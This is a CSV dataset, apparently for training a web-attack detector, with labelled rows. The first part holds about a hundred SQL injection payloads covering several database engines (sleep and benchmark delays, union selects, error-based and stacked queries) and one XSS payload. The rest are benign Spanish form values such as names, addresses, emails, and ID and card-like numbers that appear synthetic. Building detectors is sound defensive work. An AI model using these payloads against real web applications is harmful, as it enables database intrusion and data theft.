payload,label,attack_type
"1"" or 8466=benchmark(5000000,md5(0x694a4745)) and ""vnei"" like ""vnei",malicious,sqli
"-4236') union all select 2076,2076,2076,2076,2076,2076,2076,2076,2076,2076#",malicious,sqli
1)) as rcbz where 4563=4563 and 2006=2006,malicious,sqli
"1' or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'xqkq'='xqkq",malicious,sqli
"1"" or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""zyoo""=""zyoo",malicious,sqli
"-8773%'))) union all select 8941,8941,8941,8941,8941,8941#",malicious,sqli
"1%""))) union all select null,null,null,null,null,null--",malicious,sqli
"1))) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",malicious,sqli
1'))) rlike sleep(5) and ((('zwyx'='zwyx,malicious,sqli
"1"" and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ""mezx"" like ""mezx",malicious,sqli
"1"") as tqxa where 6751=6751 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",malicious,sqli
"1%';select benchmark(5000000,md5(0x4c4d6142)) and '%'='",malicious,sqli
"1%'));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (('%'='",malicious,sqli
"1))) and 8635=(select count(*) from generate_series(1,5000000))--",malicious,sqli
"-1684""))) union all select 7473,7473#",malicious,sqli
"1') or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))",malicious,sqli
1) where 3671=3671;(select * from (select(sleep(5)))srmq)--,malicious,sqli
"1%"")) or 8421=(select count(*) from generate_series(1,5000000)) and ((""%""=""",malicious,sqli
"1%'))) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",malicious,sqli
"1%'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",malicious,sqli
1))) or 6793=(select 6793 from pg_sleep(5)) and (((3919=3919,malicious,sqli
-1219') or 5592=4835,malicious,sqli
"1') as kgnd where 1550=1550 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
1'+(select ksoh where 6339=6339;begin dbms_lock.sleep(5); end)+',malicious,sqli
-8636'))) or 4301=7212--,malicious,sqli
"1%"" rlike sleep(5) and ""%""=""",malicious,sqli
"1' and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",malicious,sqli
1') where 8128=8128;select (case when (4061=1396) then 4061 else 1/(select 0) end)--,malicious,sqli
"1');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('ckpm'='ckpm",malicious,sqli
1' in boolean mode) and (select * from (select(sleep(5)))gcrr)#,malicious,sqli
-1436' or 5699=5783--,malicious,sqli
1))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((9548=9548,malicious,sqli
"1 and make_set(8403=8403,8899)",malicious,sqli
"-4419%"")) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",malicious,sqli
1')));(select * from (select(sleep(5)))srmq) and ((('pfle' like 'pfle,malicious,sqli
1))) order by 1--,malicious,sqli
1') rlike sleep(5) and ('qsub' like 'qsub,malicious,sqli
"-1606'||(select 'qbaa' where 3967=3967 union all select 3967,3967,3967,3967,3967--",malicious,sqli
"1"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (((""uvzc"" like ""uvzc",malicious,sqli
"1%') union all select null,null,null,null,null,null,null,null,null,null#",malicious,sqli
"1')));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((('ojkd'='ojkd",malicious,sqli
"-6194"" or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",malicious,sqli
1);begin user_lock.sleep(5); end and (4610=4610,malicious,sqli
"1'))) and elt(2506=2383,2383) and ((('bjrj'='bjrj",malicious,sqli
"1')) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (('adnz'='adnz",malicious,sqli
"1))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((6265=6265",malicious,sqli
"1"" or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",malicious,sqli
"1'+(select lgkd where 7801=7801 and elt(4249=4249,7259))+'",malicious,sqli
1'||(select 'npdx' from dual where 9486=9486 and sleep(5))||',malicious,sqli
"1%') and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ('%'='",malicious,sqli
"-9509) union all select 1193,1193,1193#",malicious,sqli
"1' in boolean mode) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))#",malicious,sqli
"1"" or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",malicious,sqli
"1%' or 8466=benchmark(5000000,md5(0x694a4745)) and '%'='",malicious,sqli
"1) as oblq where 2002=2002 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",malicious,sqli
"1'+(select 'ycvl' where 8415=8415 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",malicious,sqli
"1%"") or 8156=(select count(*) from generate_series(1,5000000))--",malicious,sqli
1);select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,malicious,sqli
location=?javascript:alert(1)>click,malicious,xss
"1%""));iif(7011=2522,1,1/0)",malicious,sqli
"1) where 9469=9469 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
"1"") and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""otgh"" like ""otgh",malicious,sqli
"-7574%"") or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""%""=""",malicious,sqli
"1"") where 4913=4913;begin user_lock.sleep(5); end--",malicious,sqli
"-7531') union all select 3072,3072,3072,3072,3072,3072,3072--",malicious,sqli
"1 union all select null,null,null,null,null,null--",malicious,sqli
"-4869%' union all select 5729,5729,5729--",malicious,sqli
"1"" rlike (select * from (select(sleep(5)))vwyq)#",malicious,sqli
-3613%') or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('%'=',malicious,sqli
"1'+(select 'myrb' where 3622=3622 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7))+'",malicious,sqli
"1') union all select null,null,null,null,null,null,null,null,null#",malicious,sqli
"-5863"" or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ""gkvy""=""gkvy",malicious,sqli
"1 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",malicious,sqli
"1"")) as ljhz where 2416=2416;begin dbms_lock.sleep(5); end--",malicious,sqli
"1%""))) and (select * from (select(sleep(5)))gcrr)#",malicious,sqli
"-8550"") or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""kyad""=""kyad",malicious,sqli
1)) as emtf where 3561=3561 or (select * from (select(sleep(5)))ydpu)--,malicious,sqli
"1' in boolean mode) union all select null,null#",malicious,sqli
"1'))) union all select null,null#",malicious,sqli
"1') as sjmt where 6541=6541 or 8421=(select count(*) from generate_series(1,5000000))--",malicious,sqli
"1"" or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ""bkrk""=""bkrk",malicious,sqli
"-1269"" union all select 8412,8412,8412,8412,8412,8412,8412,8412--",malicious,sqli
1' and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and 'sqvt' like 'sqvt,malicious,sqli
1' where 9416=9416;begin user_lock.sleep(5); end--,malicious,sqli
"1))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((9255=9255",malicious,sqli
"1"" and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ""egzm""=""egzm",malicious,sqli
1 where 7038=7038;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,malicious,sqli
"1"") as kzuq where 4259=4259;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
"1')));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((('aatp'='aatp",malicious,sqli
"1 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
1'))) and 7533=7533 and ((('suzd' like 'suzd,malicious,sqli
"1"")));select case when 7717=7717 then 1 else null end--",malicious,sqli
"1') union all select null,null,null,null,null,null,null#",malicious,sqli
1'+(select 'iqxn' where 1146=1146 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))+',malicious,sqli
"1;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
"1') as sjij where 8659=8659;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
"1%')));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((('%'='",malicious,sqli
"1"") as eomu where 6599=6599;select * from generate_series(9167,9167,case when (9167=2273) then 1 else 0 end) limit 1--",malicious,sqli
vino rioja,benign,norm
aadir al carrito,benign,norm
d1se3cin,benign,norm
credenciales incorrectas,benign,norm
pasar por caja,benign,norm
40a5e,benign,norm
tarpey@bwds.ne,benign,norm
tronchn,benign,norm
1527409541807001,benign,norm
de_la,benign,norm
canella,benign,norm
calle palencia s/n,benign,norm
madrid,benign,norm
magrath,benign,norm
958,benign,norm
gina,benign,norm
61877469v,benign,norm
08880,benign,norm
misczak,benign,norm
fredes damas,benign,norm
camio canexa 161 11?g,benign,norm
burgos,benign,norm
81,benign,norm
6429,benign,norm
clodoveo,benign,norm
00792659x,benign,norm
26329,benign,norm
pacon,benign,norm
maurici garrudo,benign,norm
"c/ arquitecto ricardo velazquez bosco, 127, 3g",benign,norm
asturias,benign,norm
aguistin,benign,norm
1499,benign,norm
er6til,benign,norm
hammong4@asyra.st,benign,norm
riudellots de la selva,benign,norm
9448799154735544,benign,norm
inocencia,benign,norm
54310177r,benign,norm
10858,benign,norm
jamn ibrico,benign,norm
shing-mi,benign,norm
hews,benign,norm
sams agea,benign,norm
c/ dique de abrigo 96 5?h,benign,norm
navarra,benign,norm
ras4rojar,benign,norm
bearse@cdgranadabaila.lv,benign,norm
sant andreu salou,benign,norm
68,benign,norm
2304,benign,norm
dalmacio,benign,norm
46208410f,benign,norm
05140,benign,norm
araero,benign,norm
mullen@menorca.com.bf,benign,norm
duesaiges,benign,norm
83,benign,norm
5696,benign,norm
canela,benign,norm
78285910m,benign,norm
44142,benign,norm
phillis7,benign,norm
vallb remesar,benign,norm
c/ rivera de los limonetes 98,benign,norm
2771560137305516,benign,norm
7427,benign,norm
itziar,benign,norm
88194085x,benign,norm
07460,benign,norm
mcarthur,benign,norm
virhuez prats,benign,norm
"camino el pino, 151, 5-b",benign,norm
badajoz,benign,norm
syrett,benign,norm
brinn,benign,norm
guinaldo guals,benign,norm
"travesia palacio 61, 1?d",benign,norm
teruel,benign,norm
8ef6ndo,benign,norm
euzaine@schnapps.com.gs,benign,norm
cenicientos,benign,norm
7057231009442608,benign,norm
vimbre,benign,norm
canto,benign,norm
mamakos@palodegolf.com.rw,benign,norm
castillejo de meslen,benign,norm
9171998825449770,benign,norm
vlentina,benign,norm
54430634f,benign,norm
48210,benign,norm
22,benign,norm
2095,benign,norm
iair,benign,norm
29655758h,benign,norm
47529,benign,norm
des9o89451rac28,benign,norm
barres@engibraltar.bm,benign,norm
retamal de llerena,benign,norm
35,benign,norm
859,benign,norm
rosa,benign,norm
27404814s,benign,norm
39426,benign,norm
legitimacin,benign,norm
colliti.shale@ropadegolf.com.dd,benign,norm
garaioa,benign,norm
1943374801106050,benign,norm
matacandelas,benign,norm
chascar,benign,norm
cary-whitten@magritte.pe,benign,norm
llub,benign,norm
5690251194310555,benign,norm
mara de aranz,benign,norm
56546514w,benign,norm
43550,benign,norm
jacobsen,benign,norm
raymona,benign,norm
pompa,benign,norm
"port fangos, 183,",benign,norm
granada,benign,norm
colmada,benign,norm
entwistle_ruetting@comonuevo.ro,benign,norm
briviesca,benign,norm
2756434329152004,benign,norm
teosa,benign,norm
flo3a,benign,norm
robeling.colmar8@diagnosticoradiologico.nf,benign,norm
"somozas, as",benign,norm
4662359455480921,benign,norm
mallki,benign,norm
70153244r,benign,norm
03153,benign,norm
17,benign,norm
5844,benign,norm
augusto,benign,norm
11938734d,benign,norm
41230,benign,norm
althea4,benign,norm
escat monistca,benign,norm
"calle duque de ahumada, 67,",benign,norm
3781089949607589,benign,norm
376gstu90,benign,norm
400ol4,benign,norm
selwart@studentrooms.zr,benign,norm
bobadilla del campo,benign,norm
gail,benign,norm
conocchiari zagal,benign,norm
"camino viejo, 2,",benign,norm
guadalajara,benign,norm
embo4ina80,benign,norm
garantir,benign,norm
pangborn@informex.me,benign,norm
medina de rioseco,benign,norm
rees,benign,norm
irizar morata,benign,norm
"c/ vallcorba 152, 7?f",benign,norm
4796381600285073,benign,norm
d0s9pi2car,benign,norm
atontamiento,benign,norm
blomgren@informex.jp,benign,norm
fuente el olmo de fuentiduea,benign,norm
masao,benign,norm
saleta,benign,norm
"el reyezuelo, 15",benign,norm
len,benign,norm
franza,benign,norm
omura5,benign,norm
tolosa fontanet,benign,norm
"calle arenys de mar, 113,",benign,norm
7627570556544379,benign,norm
ivana,benign,norm
25292190x,benign,norm
48381,benign,norm
kesling8,benign,norm
mazarick1,benign,norm
pampanas soto,benign,norm
"calle finlandia, 46, 6-a",benign,norm
9571001152380461,benign,norm
sia,benign,norm
96304534s,benign,norm
16707,benign,norm
beique,benign,norm
parypa,benign,norm
andara francino,benign,norm
"quintana 19, 13f",benign,norm
0945394059491882,benign,norm
zulaica,benign,norm
27340064x,benign,norm
01548,benign,norm
thibaud79,benign,norm
triantap,benign,norm
moll aybar,benign,norm
"c/ murillo, 106 5c",benign,norm
valencia,benign,norm
enmade6ar,benign,norm
papa@opel-e-flex.cg,benign,norm
margalef,benign,norm
97,benign,norm
119,benign,norm
jaaziel,benign,norm
69309273s,benign,norm
16582,benign,norm
61tico,benign,norm
52946142g,benign,norm
06519,benign,norm
4,benign,norm
3218,benign,norm
amine,benign,norm
70129758k,benign,norm
9449507239645140,benign,norm
eugenio,benign,norm
88253687l,benign,norm
45510,benign,norm
t2591151,benign,norm
desafinar,benign,norm
ranez@sandrasummer.bi,benign,norm
santa marta de tormes,benign,norm
xiaojing,benign,norm
milton@diagnosticoradiologico.asia,benign,norm
aliseda,benign,norm
64,benign,norm
1680,benign,norm
sabrina,benign,norm
86343464s,benign,norm
50259,benign,norm
poli8l2a,benign,norm
delaune@tintasultravioleta.io,benign,norm
poboleda,benign,norm
88,benign,norm
8285,benign,norm
constante,benign,norm
91494736t,benign,norm
24830,benign,norm
sudip,benign,norm
sevilla subauste,benign,norm
"calle rocafort, 169 4c",benign,norm
1918370923327655,benign,norm
9334,benign,norm
manay crespo,benign,norm
campanario,benign,norm
marineau,benign,norm
joan pelliser,benign,norm
"c/ de las gloxinias 91,",benign,norm
8510133826812144,benign,norm
3953,benign,norm
barcario,benign,norm
53933880f,benign,norm
02247,benign,norm
rabassa,benign,norm
dresdel.holmer@xavipetit.um,benign,norm
"fregeneda, la",benign,norm
centeno,benign,norm
gorfine,benign,norm
moncada,benign,norm
"zeus, 22, 12g",benign,norm
8352337916705491,benign,norm
veneranda,benign,norm
27415264t,benign,norm
44366,benign,norm
foubert,benign,norm
souren,benign,norm
